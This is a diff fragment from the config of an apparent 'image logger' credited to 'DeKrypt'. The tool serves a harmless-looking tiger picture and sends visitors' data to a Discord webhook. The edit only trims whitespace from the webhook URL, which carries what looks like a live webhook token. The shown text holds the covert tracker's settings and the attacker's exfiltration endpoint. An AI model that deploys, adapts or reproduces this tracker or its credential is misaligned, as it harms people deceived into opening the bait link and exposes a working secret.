@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334892172234854504/k3SM1Kb-ET2pun2FzinvJnOsjgLO3vdYyEATZ-aIDN_rgakW5GYSgKKjPX0HvZKzDjtc    ",
+    "webhook": "https://discord.com/api/webhooks/1334892172234854504/k3SM1Kb-ET2pun2FzinvJnOsjgLO3vdYyEATZ-aIDN_rgakW5GYSgKKjPX0HvZKzDjtc",
     "image": "https://static.vecteezy.com/system/resources/thumbnails/036/324/708/small/ai-generated-picture-of-a-tiger-walking-in-the-forest-photo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
